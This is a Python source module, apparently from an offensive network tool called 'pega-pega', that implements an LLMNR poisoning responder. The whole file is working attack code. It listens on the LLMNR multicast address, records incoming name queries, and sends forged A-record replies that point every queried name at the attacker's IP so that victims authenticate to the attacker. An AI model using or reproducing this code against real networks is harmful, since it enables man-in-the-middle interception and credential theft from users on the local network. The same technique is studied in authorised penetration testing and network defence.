"""LLMNR (Link-Local Multicast Name Resolution) responder.

Listens on UDP 5355 (multicast 224.0.0.252) and responds to all name
queries with our IP, poisoning name resolution so clients authenticate
to us instead of the intended target.

LLMNR uses the same wire format as DNS (RFC 4795).
"""

import asyncio
import logging
import socket
import struct

from .base import BaseProtocolHandler
from ..models import CapturedRequest, Protocol

logger = logging.getLogger("pega-pega")

LLMNR_MCAST_ADDR = "224.0.0.252"
LLMNR_PORT = 5355


class _LlmnrProtocol(asyncio.DatagramProtocol):
    def __init__(self, handler: "LlmnrHandler"):
        self.handler = handler
        self.transport: asyncio.DatagramTransport | None = None

    def connection_made(self, transport: asyncio.DatagramTransport):
        self.transport = transport

    def datagram_received(self, data: bytes, addr: tuple):
        asyncio.ensure_future(self._handle(data, addr))

    def error_received(self, exc: Exception):
        logger.debug("LLMNR error: %s", exc)

    async def _handle(self, data: bytes, addr: tuple):
        source_ip, source_port = addr[0], addr[1]

        if len(data) < 12:
            return

        # Parse LLMNR header (same as DNS)
        txn_id = struct.unpack("!H", data[0:2])[0]
        flags = struct.unpack("!H", data[2:4])[0]
        qr = (flags >> 15) & 1
        if qr == 1:
            # This is a response, ignore
            return

        qdcount = struct.unpack("!H", data[4:6])[0]
        if qdcount == 0:
            return

        # Parse the query name
        name, offset = _parse_name(data, 12)
        if not name:
            return

        # Query type and class
        if offset + 4 > len(data):
            return
        qtype = struct.unpack("!H", data[offset:offset + 2])[0]
        qclass = struct.unpack("!H", data[offset + 2:offset + 4])[0]

        qtype_name = {1: "A", 28: "AAAA", 255: "ANY"}.get(qtype, f"TYPE{qtype}")

        summary = f"QUERY {name} ({qtype_name})"

        await self.handler.emit(CapturedRequest(
            protocol=Protocol.LLMNR,
            source_ip=source_ip,
            source_port=source_port,
            dest_port=self.handler.port,
            summary=summary,
            details={
                "name": name,
                "qtype": qtype_name,
                "txn_id": txn_id,
                "operation": "QUERY",
            },
            raw_data=data,
        ))

        logger.info("LLMNR %s from %s:%d → responding with %s",
                    name, source_ip, source_port, self.handler.response_ip)

        # Build poisoned response
        response = _build_response(data, txn_id, name, qtype, self.handler.response_ip)
        if response and self.transport:
            self.transport.sendto(response, addr)


class LlmnrHandler(BaseProtocolHandler):
    name = "LLMNR"
    default_port = 5355

    @property
    def response_ip(self) -> str:
        return self.global_config.get_response_ip()

    async def start(self):
        loop = asyncio.get_running_loop()
        # Create UDP socket with multicast support
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        except (AttributeError, OSError):
            pass
        sock.bind(("", self.port))

        # Join multicast group
        mreq = struct.pack("4s4s", socket.inet_aton(LLMNR_MCAST_ADDR), socket.inet_aton("0.0.0.0"))
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

        transport, _ = await loop.create_datagram_endpoint(
            lambda: _LlmnrProtocol(self),
            sock=sock,
        )
        self._servers.append(transport)
        logger.info("LLMNR handler listening on %s:%d (multicast %s)",
                    self.bind, self.port, LLMNR_MCAST_ADDR)


def _parse_name(data: bytes, offset: int) -> tuple[str, int]:
    """Parse a DNS-style name from the packet."""
    labels = []
    while offset < len(data):
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if (length & 0xC0) == 0xC0:
            # Compression pointer
            if offset + 1 >= len(data):
                break
            ptr = struct.unpack("!H", data[offset:offset + 2])[0] & 0x3FFF
            name, _ = _parse_name(data, ptr)
            labels.append(name)
            offset += 2
            return ".".join(labels), offset
        offset += 1
        if offset + length > len(data):
            break
        labels.append(data[offset:offset + length].decode("utf-8", errors="replace"))
        offset += length
    return ".".join(labels), offset


def _build_response(query: bytes, txn_id: int, name: str, qtype: int, response_ip: str) -> bytes | None:
    """Build an LLMNR response with our IP."""
    if qtype not in (1, 255):  # Only respond to A and ANY queries
        return None

    # Header: same txn_id, QR=1, QDCOUNT=1, ANCOUNT=1
    header = struct.pack("!HHHHHH", txn_id, 0x8000, 1, 1, 0, 0)

    # Question section (copy from query)
    question = query[12:]  # everything after the header

    # Find end of question section
    offset = 0
    while offset < len(question):
        length = question[offset]
        if length == 0:
            offset += 1 + 4  # null byte + QTYPE + QCLASS
            break
        if (length & 0xC0) == 0xC0:
            offset += 2 + 4
            break
        offset += 1 + length
    question_section = question[:offset]

    # Answer: name pointer to question, TYPE A, CLASS IN, TTL 30, RDLENGTH 4, IP
    answer = struct.pack("!H", 0xC00C)  # pointer to name in question
    answer += struct.pack("!HHI", 1, 1, 30)  # TYPE A, CLASS IN, TTL 30
    answer += struct.pack("!H", 4)  # RDLENGTH
    answer += socket.inet_aton(response_ip)

    return header + question_section + answer
